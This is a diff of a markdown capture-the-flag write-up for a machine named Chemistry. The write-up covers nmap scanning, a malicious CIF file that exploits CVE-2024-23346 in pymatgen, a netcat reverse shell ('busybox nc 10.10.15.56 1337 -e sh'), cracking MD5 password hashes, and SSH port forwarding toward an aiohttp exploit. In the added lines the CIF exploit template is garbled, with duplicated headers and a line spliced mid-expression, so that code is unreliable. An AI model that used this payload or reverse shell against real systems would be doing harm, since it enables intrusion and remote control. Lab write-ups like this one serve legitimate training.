@@ -17,31 +17,28 @@
 The inital nmap scans reveals two ports open, 22 and 5000.
 
 <br>
-
-`$ nmap -sVC --version-intensity 9 -p 22,5000 -Pn --disable-arp-ping -n chemistry -oN nmap/versions-scan.txt`
-
-`Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org/) ) at 2024-10-22 23:37 CEST`  
-`Nmap scan report for chemistry (10.10.11.38)`  
-`Host is up (0.51s latency).`
-
-`PORT STATE SERVICE VERSION`  
-`22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)` 
-`5000/tcp open upnp?` 
-`| fingerprint-strings:`  
-`| GetRequest:`  
-`| HTTP/1.1 200 OK`  
-`| Server: Werkzeug/3.0.3 Python/3.9.5`  
-`| Date: Tue, 22 Oct 2024 21:37:54 GMT`  
-`| Content-Type: text/html; charset=utf-8`  
-`| Content-Length: 719`  
-`| Vary: Cookie`  
-`| Connection: close`  
-`|`
-`| class="title">Chemistry CIF Analyzer`  
-`|`
-`Welcome to the Chemistry CIF Analyzer. This tool allows you to upload a CIF (Crystallographic Information File) and analyze the structural data contained within.`
-
-`<---SNIP--->`
+ 
+    $ nmap -sVC --version-intensity 9 -p 22,5000 -Pn --disable-arp-ping -n chemistry -oN nmap/versions-scan.txt
+    Starting Nmap 7.80 (https://nmap.org) at 2024-10-22 23:37 CEST
+    Nmap scan report for chemistry (10.10.11.38)
+    Host is up (0.51s latency).
+    
+    PORT     STATE SERVICE VERSION
+    22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+    5000/tcp open  upnp?
+    | fingerprint-strings:
+    |   GetRequest:
+    |     HTTP/1.1 200 OK
+    |     Server: Werkzeug/3.0.3 Python/3.9.5
+    |     Date: Tue, 22 Oct 2024 21:37:54 GMT
+    |     Content-Type: text/html; charset=utf-8
+    |     Content-Length: 719
+    |     Vary: Cookie
+    |     Connection: close
+    |
+    |     class="title">Chemistry CIF Analyzer
+    |
+    |     Welcome to the Chemistry CIF Analyzer. This tool allows you to upload a CIF (Crystallographic Information File) and analyze the structural data contained within.
 
 
 <br><br>
@@ -54,40 +51,39 @@ The application hosted on the box at port 5000 looks like a parser for *Crystall
 
 <br><br>
 
-Surfing the web i find the recent *CVE-2024-23346* 
+Searching the web i find the recent *CVE-2024-23346* 
 
-https://ethicalhacking.uk/cve-2024-23346-arbitrary-code-execution-in-pymatgen-via-insecure/#gsc.tab=0
+    https://ethicalhacking.uk/cve-2024-23346-arbitrary-code-execution-in-pymatgen-via-insecure/#gsc.tab=0
 
 A vulnerability in the parsing library *Pymatgen versions prior to 2024.2.8*, that executes arbitrary code via *insecure serializazion*.
-
 All you need to do is craft a malicious .cif file, and then inject the command you want to execute in it. We have a template of the file's structure in the link above:
 
 <br>
 
-> data_Example
->
-> audit_creation_date            2018-06-08
-> 
-> _audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"
-> 
-> loop
-> 
-> parent_propagation_vector.id
-> 
-> _parent_propagation_vector.kxkykz
-> 
-> k1 [0 0 0]
-> 
-> 
-> _space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ()._class_._mro_[1]._getattribute_ ( *[().__class__.__mro__[1]]+["_sub" + "classes_"]) () if d._name_ == "BuiltinImporter"][0].load_module ("os").system ("<INSERT_PAYLOAD>");0,0,0'
-> 
-> 
-> 
-> _space_group_magn.number_BNS  62.448
-> 
-> _space_group_magn.name_BNS  "P  n'  m  a'  "
-> 
-> 
+    data_5yOhtAoR
+    _audit_creation_date            2018-06-08
+    _audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"
+    
+    loop_
+    _parent_propagation_vector.id
+    _parent_propagation_vector.kxkykz
+    k1 [0 0 0]
+    
+    _space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d indata_5yOhtAoR
+    _audit_creation_date            2018-06-08
+    _audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"
+    
+    loop_
+    _parent_propagation_vector.id
+    _parent_propagation_vector.kxkykz
+    k1 [0 0 0]
+    
+    _space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in
+    ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" +
+    "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("INSERT PAYLOAD");0,0,0'
+    
+    _space_group_magn.number_BNS  62.448
+    _space_group_magn.name_BNS  "P  n'  m  a'  " 
 
 <br><br>
 
@@ -95,7 +91,7 @@ Experimenting with an active handler and a series of bash payloads from https://
 
 <br>
 
-> *busybox nc 10.10.15.56 1337 -e sh*
+    busybox nc 10.10.15.56 1337 -e sh
 
 <br><br>
 
@@ -112,7 +108,7 @@ Checking the app's directory, i'm able to retrieve the .db database that has sto
 
 <br>
 
->    hashed_password = hashlib.md5(password.encode()).hexdigest()
+    hashed_password = hashlib.md5(password.encode()).hexdigest()
 
 <br>
 
@@ -136,7 +132,7 @@ And finally i get an initial foothold on the machine. I have a set of credential
 
 <br>
 
-> *rosa:<ROSA'S_PASSWORD>*
+    rosa:<PASSWORD>
 
 <br><br>
 
@@ -148,11 +144,11 @@ Running linpeas.sh on the machine, i find out a *service listening on port 8080*
 
 <br><br>
 
-To enumerate this service, i make up an *SSH tunneling* to our remote host, using the following command:
+To enumerate this service, i make up an *SSH Port Forwarding* to our remote host, using the following command:
 
 <br>
 
-`ssh -L 8080:localhost:8080 rosa@10.10.11.38`
+    ssh -L 8080:localhost:8080 rosa@10.10.11.38
 
 <br><br>
 
@@ -160,11 +156,12 @@ This forwards *my local* 8080 port  to the remote machine's local 8080 port.
 
 <br>
 
-(Attacking Box 127.0.0.1:8080 ----> Victim Box 127.0.0.1:8080)
+*Attacking Box 127.0.0.1:8080 ----> Victim Box 127.0.0.1:8080*
 
 <br>
 
-It basically means that i can direct external traffic, like a scan or even access the service from a browser if possible, to an internal service on a remote machine that otherwise would be accessible only from the box itself.
+It basically means that i can direct external traffic, like a scan or even access the service from a browser if possible, 
+to an internal service on a remote machine that otherwise would be accessible only from the box itself.
 Nmap shows me that Chemistry is running *aiohttp 3.9.1*...
 
 <br>
@@ -177,7 +174,7 @@ Nmap shows me that Chemistry is running *aiohttp 3.9.1*...
 
 <br>
 
-https://github.com/z3rObyte/CVE-2024-23334-PoC
+    https://github.com/z3rObyte/CVE-2024-23334-PoC
 
 <br><br>
 
